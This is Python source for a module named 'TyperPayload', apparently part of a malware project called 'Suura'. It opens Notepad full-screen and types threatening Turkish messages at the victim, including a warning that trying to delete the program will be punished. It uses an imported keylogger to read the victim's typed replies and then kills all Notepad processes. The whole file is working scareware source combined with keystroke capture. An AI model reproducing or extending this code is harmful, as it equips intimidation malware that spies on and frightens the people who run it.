import os
import signal
import time
import ctypes


from typing import Any
from threading import Timer
from threading import Thread
from Suura.includes.util import user32
from Suura.includes.util import send_char
from Suura.includes.util import list_windows

from Suura.includes.key_logger import KeySniffer
from Suura.includes.util import GetCurrentWindowTitle
from Suura.includes.localization import strings
from Suura.includes.util import AudioPlayer
from Suura.includes.util import get_pid_from_window_hwnd

from Suura.includes.util import list_proc_pids_from_name
from Suura.includes.util import kill_procs_from_pids
string = strings()

class Typer:
    def __init__(self):
        self.msgs = "This is default text"
        self._delay = 0.04
    @property
    def text(self):
        return self.msgs
    @text.setter
    def text(self,msg: str):
        if isinstance(msg,str):
            self.msgs = msg
    @property
    def delay(self) -> int:
        return self._delay
    @delay.setter
    def delay(self,dvalue: int):
        if isinstance(dvalue,int) or isinstance(dvalue,float):
            self._delay = dvalue
    def launch_notepad_with_fullscreen(self) -> bool:
        if not "not defteri" in GetCurrentWindowTitle().lower():
            try:
                os.system("cmd.exe /c start /max notepad.exe")
            except:
                return False
            time.sleep(1)
            return "not defteri" in GetCurrentWindowTitle().lower()
        return True
    def type(self):
        for _ in range(1,5):
            notepad_status = self.launch_notepad_with_fullscreen()
            if notepad_status:
                break
        status = "not defteri" in GetCurrentWindowTitle().lower() # yine de kontrol ediyoruz kullanıcı kapatırsa ya da bişey olursa diye
        time.sleep(1) # bekliyoruz
        if status:
            send_char(self.msgs,delay=self._delay)
    def check_user_input(self,handler: KeySniffer,accepting_string,timeoutstring,type_accepting_string,**kwargs):
        user_input = handler.is_user_accepted(accepting_string)
        if not user_input:
            self.text = timeoutstring
            self.type()
        else:
            self.text = type_accepting_string
            self.type()
        is_on_close_defined = kwargs.get("on_close")
        print(is_on_close_defined.__class__)
        if not is_on_close_defined is None and kwargs["on_close"].__class__.__name__ in ("function","method"):
            try:
                kwargs["on_close"]()
            except Exception as load_err:
                print(load_err)
        else:
            print("DEBUGGING")
class TyperPayload:
    def __init__(self) -> None:
        self.typer = Typer()
        self.key_sniffer = KeySniffer()
        self.key_sniffer.start()
        self._stages = {
            1:{
                "real_msg":"Eğer beni silmeye çalışırsan bunun bedelini çok kötü ödersin haberin olsun tamam mı ? ",
                "user_accept_msg":"tamam",
                "user_not_accepted_msg":"Anla veya anlama umrumda da değil ben diyeceğimi dedim sonu kötü olur haberin olsun",
                "user_accepted_msg":"Güzel öyle bende öyle düşünmüştüm bak aynı düşünceler sahibiz",
                "on_close_function":self.close_all_notepad_windows
            },
            2:{
                "real_msg":"Sana bunu yapmamanı söyledim sanırım biraz cezayı hak ettin :)",
                "user_accept_msg":"evet",
                "user_not_accepted_msg":"Artık ne yazsanda umrumda bile değil",
                "user_accepted_msg":"Dediğim gibi iş işten geçti :)",
                "on_close_function":self.close_all_notepad_windows
            }
        }
        self._stage = 0
    @property
    def stages(self):
        stage = self._stage
        if not self._stages.get(stage) is None:
            return self._stages[stage]
    @stages.setter
    def stages(self,_stage: dict):
        if isinstance(_stage,dict):
            self._stages = _stage
    @property
    def stage(self):
        return self._stage
    @stage.setter
    def stage(self,value: int):
        if isinstance(value,int) and not self._stages.get(value) is None:
            self._stage = value
    def stage_append(self,stage_num: int,stage_dict: dict):
        if stage_num > list(self._stages.keys())[-1:][0] and isinstance(stage_dict,dict):
            self._stages[stage_num] = stage_dict
    def stage_edit_key(self,index: int,key: str,value):
        is_stage_exist = self._stages.get(index) is not None
        if is_stage_exist:
            is_key_exist = self._stages[index].get(key) is not None
            if is_key_exist:
                try:
                    self._stages[index][key] = value
                except:
                    pass
    def close_all_notepad_windows(self):
        kill_procs_from_pids(*list_proc_pids_from_name("notepad.exe"))
    def type(self):
        current_status = self._stages.get(self._stage)
        if not current_status is None:
            self.typer.text = self.stages["real_msg"]
            self.typer.type()
            if self.stages["user_accept_msg"] and self.stages["user_not_accepted_msg"]:
                t = Timer(
                    5,
                    self.typer.check_user_input,
                    args = [
                        self.key_sniffer,
                        self.stages["user_accept_msg"],
                        self.stages["user_not_accepted_msg"],
                        self.stages["user_accepted_msg"],
                    ],
                    kwargs={"on_close":self.stages["on_close_function"]}
                )
                t.start()
